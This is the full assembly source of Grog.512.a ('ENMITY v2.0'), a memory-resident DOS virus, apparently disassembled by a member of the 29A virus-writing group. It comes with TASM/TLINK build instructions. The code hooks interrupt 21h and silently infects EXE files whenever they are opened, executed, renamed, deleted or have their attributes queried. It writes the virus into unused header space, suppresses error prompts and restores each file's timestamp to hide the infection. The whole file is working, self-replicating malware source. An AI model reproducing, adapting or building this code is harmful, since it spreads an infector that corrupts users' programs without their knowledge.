comment *
                               Grog.512.a              млллллм млллллм млллллм
                             Disassembly by            ллл ллл ллл ллл ллл ллл
                              Darkman/29A               мммллп плллллл ллллллл
                                                       лллмммм ммммллл ллл ллл
                                                       ллллллл ллллллп ллл ллл

  Grog.512.a is a 512 bytes resident EXE virus. Infects files at open file,
  delete file, get or set file attributes, load and/or execute program and
  rename file, by overwriting the unused space in the EXE header with the
  virus. Grog.512.a has an error handler

  I would like to thank SlageHammer for providing me the binary of this virus.

  Compile Grog.512.a with Turbo Assembler v 4.0 by typing:
  TASM /M GROG512A.ASM
  TLINK /t /x GROG512A.OBJ
*

.model tiny
.code
 org   100h                              ; Origin of Grog.512.a

code_begin:
header_begin:
data_buffer:
	     mov     ah,0a6h            ; Grog.512.a function
	     int     21h

	     jmp     virus_begin

data_buffer_:
	     dw      00h                 ; Number of relocation entries
	     dw      (header_end-header_begin)/10h
	     dw      00h,0ffffh          ; Minimum-, maximum number of para...
	     dw      00h,00h             ; Initial CS:IP relative to start ...
	     dw      ?                   ; Checksum
	     dw      00h,00h             ; Initial SS:SP relative to start ...
virus_begin:
	     cmp     al,'G'              ; Already resident?
	     je      virus_exit          ; Equal? Jump to virus_exit

	     mov     ax,3521h            ; Get interrupt vector 21h
	     int     21h
	     mov     word ptr [int21_addr],bx
	     mov     word ptr [int21_addr+02h],es

	     cli                         ; Clear interrupt-enable flag
	     mov     ax,ds:[02h]         ; AX = segment of first byte beyon...
	     mov     cx,((code_end-virus_begin)*02h+0fh)/10h+05h
	     sub     ax,cx               ; AX = segment of first byte beyon...
	     mov     ds:[02h],ax         ; Store segment of first byte beyo...

	     push    ax                  ; Save AX at stack
	     mov     cx,cs               ; CX = segment of Program Segment ...
	     sub     ax,cx               ; AX = size of memory block in par...
	     dec     cx                  ; CX = segment of current Memory C...
	     mov     ds,cx               ; DS =    "    "     "      "     "
	     mov     ds:[03h],ax         ; Store size of memory block in pa...
	     pop     es                  ; Load ES from stack (AX)

	     push    cs                  ; Save CS at stack
	     pop     ds                  ; Load DS from stack (CS)

	     xor     si,si               ; Zero SI
	     xor     di,di               ; Zero DI
	     mov     cx,(code_end-code_begin)*02h
	     rep     movsb               ; Move the virus to top of memory
	     sti                         ; Set interrupt-enable flag

	     lea     dx,int21_virus      ; DX = offset of int21_virus

	     push    es                  ; Save ES at stack
	     pop     ds                  ; Load DS from stack (ES)
     
	     mov     ax,2521h            ; Set interrupt vector 21h
	     call    int21_simula

	     push    cs cs               ; Save segments at stack
	     pop     ds es               ; Load segments from stack
virus_exit:
	     nop
	     nop

	     lea     di,buffer           ; DI = offset of buffer
	     push    di                  ; Save DI at stack

	     lea     si,restore          ; SI = offset of restore
	     mov     cx,(restore_end-restore)
	     rep     movsb               ; Move restore procedure to end of...

	     xor     ax,ax               ; Zero AX

	     ret                         ; Return!

restore      proc    near                ; Restore the infected file
	     call    delta_offse_
delta_offse_:
	     pop     bx                  ; Load BX from stack

	     push    cs                  ; Save CS at stack
	     pop     di                  ; Load DI from stack (CS)

	     add     di,10h              ; DI = segment of beginning of code

	     mov     cx,word ptr [data_buffer+14h]
	     mov     [bx+(initial_ip-buffer)-(delta_offse_-restore)],cx

	     mov     cx,word ptr [data_buffer+10h]
	     mov     [bx+(initial_sp-buffer)-(delta_offse_-restore)],cx

	     mov     cx,word ptr [data_buffer+16h]
	     add     cx,di               ; CX = initial CS relative to star...
	     mov     [bx+(initial_cs-buffer)-(delta_offse_-restore)],cx

	     mov     cx,word ptr [data_buffer+0eh]
	     add     cx,di               ; CX = initial CS relative to star...
	     mov     [bx+(initial_ss-buffer)-(delta_offse_-restore)],cx

	     mov     dx,word ptr [data_buffer+08h]
	     mov     cl,04h              ; Multiply by paragraphs
	     shl     dx,cl               ; DX = headersize

	     mov     di,100h             ; DI = offset of beginning of code

	     mov     si,dx               ; SI = headersize
	     add     si,di               ; SI = segment of beginning of code

	     push    bx                  ; Save BX at stack
	     pop     cx                  ; Load CX from stack (BX)

	     sub     cx,si               ; CX = number of bytes to move
	     repe    movsb               ; Move the original code to beginning

	     xor     ax,ax               ; Zero AX

	     cli                         ; Clear interrupt-enable flag
	     mov     ss,[bx+(initial_ss-buffer)-(delta_offse_-restore)]
	     mov     sp,[bx+(initial_sp-buffer)-(delta_offse_-restore)]
	     sti                         ; Set interrupt-enable flag

	     jmp     dword ptr [bx+(initial_csip-buffer)-(delta_offse_-restore)]
restore_end  equ     $+05h
	     endp

	     db      'ENMITY v2.0 (C) ''93 by GROG - Italy'

int21_virus  proc    near                ; Interrupt 21h of Grog.512.a
	     pushf                       ; Save flags at stack

	     cmp     ah,0a6h             ; Grog.512.a function?
	     jne     tst_function        ; Not equal? Jump to tst_function

	     mov     al,'G'              ; Already resident

	     popf                        ; Load flags from stack

	     iret                        ; Interrupt return!
tst_function:
	     cmp     ah,4bh              ; Load and/or execute program?
	     je      infect_file         ; Equal? Jump to infect_file
	     cmp     ah,3dh              ; Open file?
	     je      infect_file         ; Equal? Jump to infect_file
	     cmp     ah,56h              ; Rename file?
	     je      infect_file         ; Equal? Jump to infect_file
	     cmp     ah,43h              ; Get or set file attributes?
	     je      infect_file         ; Equal? Jump to infect_file
	     cmp     ah,41h              ; Delete file?
	     je      infect_file         ; Equal? Jump to infect_file
int21_exit:
	     popf                        ; Load flags from stack

	     db      11101010b           ; JMP imm32 (opcode 0eah)
int21_addr   dd      ?                   ; Address of interrupt 21h
	     endp
infect_file:
	     cld                         ; Clear direction flag

	     push    ax bx cx dx si di bp ds es

	     mov     si,ds               ; SI = segment of filename
	     mov     di,dx               ; DI = offset of filename

	     mov     ax,3524h            ; Get interrupt vector 24h
	     call    int21_simula
	     push    bx es               ; Save registers at stack

	     push    cs                  ; Save CS at stack
	     pop     ds                  ; Load DS from stack (CS)

	     lea     dx,int24_virus      ; DX = offset of int24_virus
	     mov     ax,2524h            ; Set interrupt vector 24h
	     call    int21_simula

	     mov     ds,si               ; DS = segment of filename
	     mov     dx,di               ; DX = offset of filename
	     mov     ax,3d02h            ; Open file (read/write)
	     call    int21_simula
	     jnc     get_file_inf        ; No error? Jump to get_file_inf

	     jmp     infect_exit

	     nop
get_file_inf:
	     xchg    ax,bx               ; BX = file handle

	     push    cs cs               ; Save segments at stack
	     pop     ds es               ; Load segments from stack

	     mov     ax,5700h            ; Get file's date and time
	     call    int21_simula
	     push    cx dx               ; Save registers at stack

	     lea     dx,data_buffer_     ; DX = offset of data_buffer_
	     mov     si,dx               ; SI =   "    "       "

	     mov     ah,3fh              ; Read from file
	     mov     cx,01h              ; Read one byte
	     call    int21_simula

	     lodsb                       ; AL = byte of data_buffer_
	     cmp     al,'M'              ; Found EXE signature?
	     je      read_file_          ; Equal? Jump to read_file_

	     jmp     infect_exit_

	     nop
read_file_:
	     lea     dx,data_buffer_-100h
	     call    set_file_pos

	     mov     ah,3fh              ; Read from file
	     mov     cx,12h              ; Read eighteen bytes
	     lea     dx,data_buffer_     ; DX = offset of data_buffer_
	     mov     si,dx               ; SI =   "    "       "
	     call    int21_simula

	     lodsw                       ; AX = number of relocation entries
	     cmp     ax,00h              ; No relocation entries?
	     je      exam_buffer         ; Equal? Jump to exam_buffer

	     jmp     infect_exit_

	     nop
exam_buffer:
	     lodsw                       ; AX = header size in paragraphs
	     cmp     ax,20h              ; EXE header too small?
	     jae     exam_filesiz        ; Above or equal? Jump to exam_fil...

	     jmp     infect_exit_

	     nop
exam_filesiz:
	     mov     al,02h              ; Set current file position (EOF)
	     xor     dx,dx               ; DX = low-order word of offset fi...
	     call    set_file_po_

	     cmp     dx,00h              ; Filesize too large?
	     jne     infect_exit_        ; Not equal? Jump to infect_exit_
	     cmp     ax,400h             ; Filesize too small?
	     jb      infect_exit_        ; Below? Jump to infect_exit_
	     cmp     ax,offset max_filesize
	     ja      infect_exit_        ; Above? Jump to infect_exit_

	     xor     dx,dx               ; DX = low-order word of offset fi...
	     call    set_file_pos

	     mov     ah,40h              ; Write to file
	     mov     cx,(code_end-code_begin)
	     lea     dx,code_begin       ; DX = offset of code_begin
	     call    int21_simula

	     pop     dx cx               ; Load registers from stack
	     mov     ax,5701h            ; Set file's date and time
	     call    int21_simula
close_file:
	     mov     ah,3eh              ; Close file
	     call    int21_simula
infect_exit:
	     pop     ds dx               ; Load registers from stack
	     mov     ax,2524h            ; Set interrupt vector 24h
	     call    int21_simula

	     pop     es ds bp di si dx cx bx ax

	     jmp     int21_exit
infect_exit_:
	     pop     dx cx              ; Load registers from stack

	     jmp     close_file

	     db      '>>3/93<<'

set_file_pos proc    near
	     xor     al,al               ; Set current file position (SOF)

set_file_po_ proc    near                ;  "     "     "      "
	     mov     ah,42h              ;  "     "     "      "
	     xor     cx,cx               ; CX = high-order word of offset f...
	     call    int21_simula

	     ret                         ; Return!
	     endp
	     endp

int24_virus  proc    near                ; Interrupt 24h of Grog.512.a
	     xor     al,al               ; ignore error and continue proces...

	     iret                        ; Interrupt return!
	     endp

int21_simula proc    near                ; Simulate interrupt 21h
	     pushf                       ; Save flags at stack

	     call    cs:[int21_addr]

	     ret                         ; Return!
	     endp

	     db      0dh,0ah
	     db      'ЩЭФ',0dh,0ah
	     db      'ЬЭФ',0dh,0ah
	     db      'ШЭФќmity',09h,'by GROG',0dh,0ah
header_end:
code_end:
	     mov     ax,4c00h            ; Terminate with return code
	     int     21h

	     db      0e75bh dup(?)
max_filesize:
	     db      02h dup(?)
initial_csip equ     dword ptr $         ; Initial CS:IP relative to start ...
initial_ip   dw      ?                   ; Initial IP
initial_cs   dw      ?                   ; Initial CS relative to start of ...
initial_sp   dw      ?                   ; Initial SP
initial_ss   dw      ?                   ; Initial SS relative to start of ...
buffer	     db      (restore_end-restore) dup(?)
data_end:

end	     code_begin
